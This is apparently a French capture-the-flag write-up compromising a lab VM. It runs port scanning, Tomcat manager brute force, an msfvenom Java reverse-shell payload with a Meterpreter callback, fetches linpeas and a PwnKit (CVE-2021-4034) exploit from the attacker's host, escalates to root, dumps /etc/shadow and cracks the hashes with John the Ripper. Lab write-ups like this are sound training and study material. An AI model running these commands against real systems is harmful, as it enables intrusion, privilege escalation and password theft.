1.  <ins>Énumération</ins>

👁️ **Nmap & Masscan**

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $sudo sh massap.sh
Entrer une IP: 192.168.56.29
Entrer un rate: 1000
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-01-13 18:15:32 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 19:18 CET           
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:18
Completed NSE at 19:18, 10.02s elapsed
Initiating NSE at 19:18
Completed NSE at 19:18, 0.00s elapsed
Initiating ARP Ping Scan at 19:18
Scanning 192.168.56.29 [1 port]
Completed ARP Ping Scan at 19:18, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:18
Completed Parallel DNS resolution of 1 host. at 19:18, 0.00s elapsed
Initiating SYN Stealth Scan at 19:18
Scanning 192.168.56.29 [2 ports]
Discovered open port 22/tcp on 192.168.56.29
Discovered open port 8080/tcp on 192.168.56.29
```

&nbsp;

<span style="color: #dddddd;">💥</span> **Metasploit - tomcat**

Brute force avec une wordlist d’utilisateur et mot de passe par défaut

```
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run

[+] 192.168.56.29:8080 - Login Successful: tomcat:role1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> 
```

&nbsp;

<ins>2.Exploitation</ins>

**<span style="color: #dddddd;"><span style="color: #dddddd;">👻</span></span> MSFvenom**

Création d’un `reverse shell` en java

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f war > revshelll.war
Payload size: 6214 bytes
Final size of war file: 6214 bytes
```

&nbsp;

**💥 Metasploit - meterpreter**

Ecoute du port `4444` pour obtenir le revershell

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit

[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] Sending stage (58037 bytes) to 192.168.56.29
[*] Meterpreter session 1 opened (192.168.56.104:4444 -> 192.168.56.29:60090) at 2025-01-13 19:59:11 +0100

(Meterpreter 1)(/) >
```

&nbsp;

**<span style="color: #dddddd;">🤖</span> Linpeas**

Téléchargement depuis ma machine le script `bash`

```
(Meterpreter 1)(/) > cd /tmp
(Meterpreter 1)(/tmp) > shell
Process 3 created.
Channel 5 created.
bash -i
tomcat@miletus:/tmp$
tomcat@miletus:/tmp$ curl -O 192.168.56.104:8181/linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  828k  100  828k    0     0  38.5M      0 --:--:-- --:--:-- --:--:-- 38.5M
```

&nbsp;

Exploit potentiel d’élévation de privilège

```
tomcat@miletus:/tmp$ sh linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

&nbsp;

**<span style="color: #dddddd;">💀</span> Exploit PwnKit**

Test de l’exploit

```
tomcat@miletus:/tmp$ curl -O 192.168.56.104:8181/PwnKit
curl -O 192.168.56.104:8181/PwnKit
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 18040  100 18040    0     0  1601k      0 --:--:-- --:--:-- --:--:-- 1601k
tomcat@miletus:/tmp$ ./PwnKit
./PwnKit
id
uid=0(root) gid=0(root) groups=0(root),999(tomcat)
bash -i
root@miletus:/tmp# 
```

&nbsp;

Dump des hash utilisateur du fichier `shadow`

```
root@miletus:/tmp# cat /etc/shadow
cat /etc/shadow
root:$1$root$QBgvNQo1oG6uBsRhpHVcF0:18854:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18854:0:99999:7:::
thales:$6$Y9smI36b$guxECvhWSBfjNVrX4s6GmgZEUOWZ.jNJBcn6j2aera6OgzX87IfNz9Fz1auf3tUzylJrrw4nHt5vEQwGRMYG0/:18855:0:99999:7:::
tomcat:!:18854::::::
```

&nbsp;

**🧨 JohnTheRipper**

Crack du hash de l’user `thales` & `root`

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john thales --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
vodka06          (thales)     
1g 0:00:12:58 DONE (2025-01-13 21:21) 0.001284g/s 3673p/s 3673c/s 3673C/s voezz..vodiensex
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john --show thales
thales:vodka06:18855:0:99999:7:::

1 password hash cracked, 0 left
```

&nbsp;

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john thales --wordlist=rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:04 6.22% (ETA: 21:27:20) 0g/s 237808p/s 237808c/s 237808C/s belatz..beckiere
ghost2000        (root)     
1g 0:00:00:30 DONE (2025-01-13 21:26) 0.03293g/s 255481p/s 255481c/s 255481C/s ghostgfb..ghorazz
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john thales --show
root:ghost2000:18854:0:99999:7:::

1 password hash cracked, 0 left
```

&nbsp;

Cred final trouver

| User | Password |
| --- | --- |
| thales | vodka06 |
| root | ghost2000 |